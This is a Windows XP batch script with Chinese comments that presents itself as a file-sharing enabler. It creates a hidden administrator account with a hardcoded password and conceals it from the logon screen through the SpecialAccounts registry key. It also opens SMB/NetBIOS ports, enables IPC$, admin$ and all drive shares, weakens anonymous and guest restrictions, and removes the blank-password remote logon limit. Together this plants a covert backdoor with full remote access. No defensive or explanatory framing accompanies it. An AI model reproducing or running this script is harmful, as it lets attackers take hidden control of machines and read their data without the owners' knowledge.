::开启共享批处理,对Windows xp有用

@echo off
set myuser=asp_sql
set mypwd=asp123

::添加隐形账户
net user %myuser% /delete
net user %myuser% %mypwd% /add
net user %myuser% %mypwd%
net localgroup administrators %myuser% /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %myuser% /t reg_dword /d 00000000 /f

::添加防火墙限制
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 137:udP /t reg_sz /d 137:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 138:udP /t reg_sz /d 138:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22002 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 139:TCP /t reg_sz /d 139:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22004 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 445:TCP /t reg_sz /d 445:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22005 /f


::开启IPC$共享
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymous /t reg_dword /d 00000000 /f

::开启admin$共享
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v AutoShareWks /t reg_dword /d 00000001 /f
net share admin$

::开启c$，d$等默认共享
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v AutoShareServer /t reg_dword /d 00000001 /f
for %%a in (c d e f g h i j k l m n) do @(
if exist %%a: (
net share %%a$=%%a:
)
)

::将“本地安全设置-本地帐户的共享和安全模式” 从“仅来宾”改为“经典”
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v forceguest /t reg_dword /d 00000000 /f

::去除空密码远程登录限制
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankpassworduse /t reg_dword /d 00000000 /f

